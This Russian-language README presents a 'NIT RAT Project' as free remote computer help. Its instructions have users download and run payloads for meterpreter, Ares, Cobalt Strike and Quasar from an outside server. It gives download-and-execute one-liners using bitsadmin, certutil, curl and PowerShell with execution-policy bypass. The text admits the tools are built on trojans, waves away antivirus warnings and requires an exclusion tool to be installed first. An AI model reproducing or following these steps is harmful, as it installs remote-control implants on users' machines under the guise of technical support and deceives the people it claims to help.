# NIT RAT Project

Данный проект предназначен для оказания удалённой компьютерной помощи пользователю в случае, если по каким-то причинам компьютерный мастер не может прийти в дом/офис. Помощь оказывается через выделенные сервера NIT.

**Примечание**. Для запуска этих программ на компьютере пользователя должны быть установлены .Net Framework 4, NIT TinyExclusion, NIT TinyExeFiles. Прежде, чем воспользоваться данной помощью, необходимо установить данные программы.

**Примечание**. Антивирусные программы будут воспринимать данное программное обеспечение как содержащее вирусы. Это действительно так. Все перечисленные ниже программы относятся к так называемой группе Remote Access Tool (средства удалённого доступа). Эти средства автоматически попадают в чёрные списки антивирусных программ как потенциально опасные (догадались почему?), и исключают из него только платные и условно-бесплатные сервисы (типа RMS, AnyDesk, TeamViewer и т.д.). Поскольку программисты искали бесплатное решение, пришлось брать за основу троянцы. Но пользователю беспокоится нечего. Программа скачивается, запускается на компьютере и остаётся активной только до первой перезагрузки. К тому же она хорошо детектируется любым антивирусом. Не запущенная программа вообще не представляет никакой опасности. Так что личные данные пользователя никуда не утекают, чего нельзя сказать о многих коммерческих продуктах...

## Получение помощи

Для получения помощи вначале уточните, какой программой будет пользоваться мастер. Данные программы не взаимозаменяемые, и только мастер может уточнить использование программы в каждом конкретном случае. Далее необходимо скачать и установить программу.

Способ 1 подходит, если вы сидите за компьютером, и можете скачивать файлы и устанавливать программы сами. Самый распространённый случай.

Способ 2 подходит, если вы имеете только удалённый консольный доступ к компьютеру или серверу, можете подавать ему команды из командной строки, но не обязательно имеете возможность получить ответ. Такое случается, например, когда вы «вдруг» потеряли доступ к удалённой машине Windows, а вам нужно срочно его восстановить. Более подробно об этих способах смотри файл *nit-adjust-run*.

#### Программа meterpreter

Способ 1:

Загрузите файл по ссылке и запустите его в папке «Загрузки»:

<http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-meterpreter-remote-RAT.bat>

Способ 2:

Последовательно выполните следующие команды на удалённом компьютере/сервере:

Команда 1:

```text
bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd
```

(работает только в командных файлах или при виртуальном доступе), или

```text
certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd
```

(часто не запускается, блокируется антивирусом), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd', 'C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd')
```

(требует установленного powershell 2.0+, .Net Framework 3.5+), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd' -OutFile 'C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd'
```

(требует установленного powershell 3.0+, Net Framework 4+), или

```text
c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd -o C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd
```

(работает всегда, но требует предварительной настройки)

Команда 2:

```text
cmd.exe /c C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd
```

#### Программа ares

Способ 1:

Загрузите файл по ссылке и запустите его в папке «Загрузки»:

<http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-ares-remote-RAT.bat>

Способ 2:

Последовательно выполните следующие команды на удалённом компьютере/сервере:

Команда 1:

```text
bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd C:\Users\Администратор\nit-RAT-ares-run-00.cmd
```

(работает только в командных файлах или при виртуальном доступе), или

```text
certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd C:\Users\Администратор\nit-RAT-ares-run-00.cmd
```

(часто не запускается, блокируется антивирусом), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd', 'C:\Users\Администратор\nit-RAT-ares-run-00.cmd')
```

(требует установленного powershell 2.0+, .Net Framework 3.5+), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd' -OutFile 'C:\Users\Администратор\nit-RAT-ares-run-00.cmd'
```

(требует установленного powershell 3.0+, Net Framework 4+), или

```text
c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd -o C:\Users\Администратор\nit-RAT-ares-run-00.cmd
```

(работает всегда, но требует предварительной настройки)

Команда 2:

```text
cmd.exe /c C:\Users\Администратор\nit-RAT-ares-run-00.cmd
```

#### Программа Cobalt Strike (не игра)

Способ 1:

Загрузите файл по ссылке и запустите его в папке «Загрузки»:

<http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-coba-remote-RAT.bat>

Способ 2:

Последовательно выполните следующие команды на удалённом компьютере/сервере:

Команда 1:

```text
bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd C:\Users\Администратор\nit-RAT-coba-run-00.cmd
```

(работает только в командных файлах или при виртуальном доступе), или

```text
certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd C:\Users\Администратор\nit-RAT-coba-run-00.cmd
```

(часто не запускается, блокируется антивирусом), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd', 'C:\Users\Администратор\nit-RAT-coba-run-00.cmd')
```

(требует установленного powershell 2.0+, .Net Framework 3.5+), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd' -OutFile 'C:\Users\Администратор\nit-RAT-coba-run-00.cmd'
```

(требует установленного powershell 3.0+, Net Framework 4+), или

```text
c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd -o C:\Users\Администратор\nit-RAT-coba-run-00.cmd
```

(работает всегда, но требует предварительной настройки)

Команда 2:

```text
cmd.exe /c C:\Users\Администратор\nit-RAT-coba-run-00.cmd
```

#### Программа Quasar (не игра)

Способ 1:

Загрузите файл по ссылке и запустите его в папке «Загрузки»:

<http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-QUASAR-remote-RAT.bat>

Способ 2:

Последовательно выполните следующие команды на удалённом компьютере/сервере:

Команда 1:

```text
bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd
```

(работает только в командных файлах или при виртуальном доступе), или

```text
certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd
```

(часто не запускается, блокируется антивирусом), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd', 'C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd')
```

(требует установленного powershell 2.0+, .Net Framework 3.5+), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd' -OutFile 'C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd'
```

(требует установленного powershell 3.0+, Net Framework 4+), или

```text
c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd -o C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd
```

(работает всегда, но требует предварительной настройки)

Команда 2:

```text
cmd.exe /c C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd
```

## Тестовые программы

Данные программы используются только для внутренних тестов сервера и для помощи пользователям не используются. Пользователю их запускать ни в коем случае не нужно (возможна нестабильная работа компьютера).

#### Программа meterpreter (локальный запуск)

Способ 1:

Загрузите файл по ссылке и запустите его в папке «Загрузки»:

<http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-meterpreter-local-RAT.bat>

Способ 2:

Последовательно выполните следующие команды на удалённом компьютере/сервере:

Команда 1:

```text
bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd
```

(работает только в командных файлах или при виртуальном доступе), или

```text
certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd
```

(часто не запускается, блокируется антивирусом), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd', 'C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd')
```

(требует установленного powershell 2.0+, .Net Framework 3.5+), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd' -OutFile 'C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd'
```

(требует установленного powershell 3.0+, Net Framework 4+), или

```text
c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd -o C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd
```

(работает всегда, но требует предварительной настройки)

Команда 2:

```text
cmd.exe /c C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd
```

#### Программа Template (ничего не делает)

Способ 1:

Загрузите файл по ссылке и запустите его в папке «Загрузки»:

<http://distrib.netip6.ru:80/NIT/RAT/download.php?file=DnRn-RAT-Template.bat>

Способ 2:

Последовательно выполните следующие команды на удалённом компьютере/сервере:

Команда 1:

```text
bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd C:\Users\Администратор\nit-RAT-Template-run-00.cmd
```

(работает только в командных файлах или при виртуальном доступе), или

```text
certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd C:\Users\Администратор\nit-RAT-Template-run-00.cmd
```

(часто не запускается, блокируется антивирусом), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd', 'C:\Users\Администратор\nit-RAT-Template-run-00.cmd')
```

(требует установленного powershell 2.0+, .Net Framework 3.5+), или

```text
powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd' -OutFile 'C:\Users\Администратор\nit-RAT-Template-run-00.cmd'
```

(требует установленного powershell 3.0+, Net Framework 4+), или

```text
c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd -o C:\Users\Администратор\nit-RAT-Template-run-00.cmd
```

(работает всегда, но требует предварительной настройки)

Команда 2:

```text
cmd.exe /c C:\Users\Администратор\nit-RAT-Template-run-00.cmd
```
